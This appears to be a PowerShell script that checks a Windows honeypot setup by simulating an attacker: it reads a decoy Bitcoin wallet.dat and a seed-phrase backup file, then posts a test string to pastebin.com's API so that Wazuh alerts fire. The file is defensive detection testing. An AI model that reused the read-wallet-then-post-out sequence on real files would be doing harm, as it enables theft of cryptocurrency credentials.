# Honeypot Deployment Validation Script (Windows)
# This script simulates an attacker accessing honeypot files to verify
# that Wazuh alerts are correctly triggered.

Write-Host "Starting Honeypot Validation..." -ForegroundColor Cyan

# 1. Check if artifacts exist
$btcPath = "$env:APPDATA\Bitcoin\wallets\wallet.dat"
Write-Host -NoNewline "Checking for honeypot artifacts... "
if (Test-Path $btcPath) {
    Write-Host "FOUND" -ForegroundColor Green
} else {
    Write-Host "NOT FOUND" -ForegroundColor Red
    Write-Host "Please run deploy.ps1 or honeypot-deployer generate first."
}

# 2. Simulate Access (Layer 1 & 2)
Write-Host "Simulating wallet access (type $btcPath)..."
if (Test-Path $btcPath) {
    Get-Content $btcPath > $null
}

$seedPath = "$env:USERPROFILE\Documents\seed-backup.txt"
Write-Host "Simulating seed phrase access (Select-String -Path $seedPath)..."
if (Test-Path $seedPath) {
    Select-String -Path $seedPath -Pattern "seed" > $null
}

# 3. Simulate Exfiltration Attempt (Layer 3)
Write-Host "Simulating exfiltration attempt (Invoke-WebRequest after access)..."
try {
    Invoke-WebRequest -Uri "https://pastebin.com/api/post" -Method Post -Body "test honeypot access" -UseBasicParsing > $null
} catch {
    # Expected to fail if no internet or invalid API key, but the process execution is what matters
}

Write-Host "`nValidation triggers complete." -ForegroundColor Cyan
Write-Host "Please check your Wazuh Dashboard for Rule IDs 100501, 100510, and 100520." -ForegroundColor Green
